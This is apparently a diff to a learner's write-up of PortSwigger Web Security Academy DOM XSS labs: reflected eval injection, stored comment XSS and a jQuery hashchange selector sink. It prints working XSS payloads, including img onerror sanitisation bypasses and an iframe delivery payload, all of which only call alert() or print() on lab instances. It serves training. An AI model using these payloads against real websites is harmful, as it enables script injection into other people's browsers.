@@ -187,5 +187,53 @@ To solve this lab, create an injection that <b>calls the alert() function</b>.
 The steps used to perform can be reached below (sequence).
 1. https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
 2. https://0ade009103fee64e80d08aa5002100c4.web-security-academy.net/?search=a
-3. Based on inspection, we can see the "searchResults.js" with "eval", and also there is JSON response after we sent our input. With this informations. After try few input, the backslash <code>```\```</code> can be escaped from the JSON response, now we can try <code>\</code>
-(https://0ade009103fee64e80d08aa5002100c4.web-security-academy.net/?search=\%22-alert(1)//).
+3. Based on inspection, we can see the "searchResults.js" with "eval", and also there is JSON response after we sent our input. With this informations. After try few input, the backslash <code>```\```</code> can be escaped from the JSON response, now we can try (https://0ade009103fee64e80d08aa5002100c4.web-security-academy.net/?search=\%22-alert(1)//).
+
+# 13. Stored DOM XSS
+#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored
+<b>Problem:</b> This lab demonstrates a stored DOM vulnerability in the blog comment functionality. 
+
+To solve this lab, exploit this vulnerability to <b>call the alert() function</b>.
+The steps used to perform can be reached below (sequence).
+1. https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
+2. https://0acf00750317f7cd81f6e8c3004300e3.web-security-academy.net/post?postId=8
+3. I've tried <code>```"</textarea> <script>alert(1)</script>```</code> with the simple input required for Name, Email, Website; the 2nd payload for Text Area is <code>```"</p> <script>alert(1)</script>```</code>. Since two of payloads failed, then need to other trick to bypass the sanitazion.
+4. We can try to put the bracket, so the first bracket would be sanitized and the rest are escaped. <code>```"</p><><img src=a onerror=alert(1)>```</code>.
+5. With this, the script was able to execute and well stored on the website. This will cause every visitors will get the impact of script execution.
+
+# 14. DOM XSS in jQuery selector sink using a hashchange event
+#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
+
+<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
+
+To solve this lab, exploit this vulnerability to <b>calls the print() function</b>.
+The steps used to perform can be reached below (sequence).
+1. https://0a1700b70402ed0b80a5033c00fe00c3.web-security-academy.net/
+2. https://0a1700b70402ed0b80a5033c00fe00c3.web-security-academy.net/post?postId=4
+I'm using the payload on comment, name, email, website to see the stored  value on the html. Also i try to escape the ```<p>``` tag using <code>```"</p><><img src=a onerror=print()>```</code> (same as previous). Unfortunately it fails.
+3. Since this jQuery selector, we need to see deeper and focused on the script. We have to inspect the page and I found:
+  ```
+<script>
+  $(window).on('hashchange', function(){
+      var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+      if (post) post.get(0).scrollIntoView();
+  });
+</script>
+  ``` 
+4. With that information, we can see directly to the blog section and focused on h2. I simply just pick the first one and try to edit the url: https://0a1700b70402ed0b80a5033c00fe00c3.web-security-academy.net/#Importance%20of%20Relaxing.
+5. We can move on to the next script, which variable checking, in this case "post" is the name of the variable. We may check the script 
+```
+$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+```
+and it shows 
+
+```
+p {0: h2, selector: 'section.blog-list h2:contains(Say It With Flowers - Or Maybe Not)', length: 1, prevObject: init, context: document}
+```
+also if we just set the "post" variable then it shows <code>undefined</code> which <b>no return</b>. So the idea of this script is, if the "post" (variable name) is undefined or just exist, then execute ```post.get(0).scrollIntoView()```.
+
+6. Since I don't know deep about coding and jQuery, let's just try to focus on "post" variable. Let's see this: ```$('section.blog-list h2:contains(<img src=a onerror=alert(1)>)');```. That code will grab the <code>img</code> parameter and just execute the <code>alert</code> function, which means we can try to directly edit the URL and try attack not on our web page but another server, so the web will execute our script.
+7. By using this script, we sent our payload to the web then web will execute our script 
+```
+<iframe src="https://0a1700b70402ed0b80a5033c00fe00c3.web-security-academy.net/#" onload="this.src+='<img src=a onerror=print()>'"></iframe>
+```
